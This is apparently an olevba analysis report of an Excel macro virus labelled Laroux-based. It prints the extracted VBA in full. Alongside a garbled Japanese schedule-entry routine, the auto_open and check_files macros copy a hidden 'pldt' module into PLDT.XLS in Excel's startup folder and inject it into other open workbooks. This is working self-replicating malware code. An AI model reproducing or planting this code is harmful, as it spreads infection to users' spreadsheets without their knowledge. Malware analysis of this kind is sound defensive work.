olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-bb3fb37eceaea4c9c1d31fedaae7b55b2a45c283
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO pldt.bas 
in file: Virus.MSExcel.Laroux-based-bb3fb37eceaea4c9c1d31fedaae7b55b2a45c283 - OLE stream: '_VBA_PROJECT_CUR/VBA/pldt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub x() '“ь—Н()
Attribute x.VB_ProcData.VB_Invoke_Func = " \n14"
TSUKI = Sheets("ђЭ’и").Range("A3").Value + 1
Msg = ("ЌЎ‚©‚з“ь—Н‚µ‚ж‚¤‚Ж‚µ‚Д‚ў‚й“ъ’ц•\‚Н" & TSUKI & "ЊЋ“x•Є‚Е‚·‚ЛЃH")
If MsgBox(Msg, vbExclamation + vbOKCancel) = vbCancel Then
MsgBox ("‚±‚±‚©‚з‚Н“ь—Н‚Е‚«‚Ь‚№‚сЃB‹°‚к“ь‚и‚Ь‚·‚ЄЃA‘Ќ–±‰Ы ђlЋ–ѓ`Ѓ[ѓЂ ‘е’Л ЌDђоЃi‚Q‚R‚SЃj‚Ь‚Е‚І�A—ЌЉи‚ў‚Ь‚·ЃB")
Sheets("ѓЃѓjѓ…Ѓ[‰ж–К").Select
Range("a1").Select
Else
DialogSheets("dialog1").Show
If DialogSheets("dialog1").DrawingObject.Button(153) Then
Sheets("ѓЃѓjѓ…Ѓ[‰ж–К").Range("a1").Select
Else: MsgBox ("‚ ‚зЃA‚в‚Б‚П‚и‚ЎЃH(-Ў-)y-ЯЯЯ")
End If
End If
End Sub






















Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PLDT.XLS")
    If m$ = "PLDT.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("pldt").Visible = True
    Sheets("pldt").Select
    Sheets("pldt").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PLDT.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("pldt").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "pldt" Then
        Workbooks("PLDT.XLS").Sheets("pldt").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("pldt").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case Else
End Select
End Sub

-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Laroux-based-bb3fb37eceaea4c9c1d31fedaae7b55b2a45c283 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  pld
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

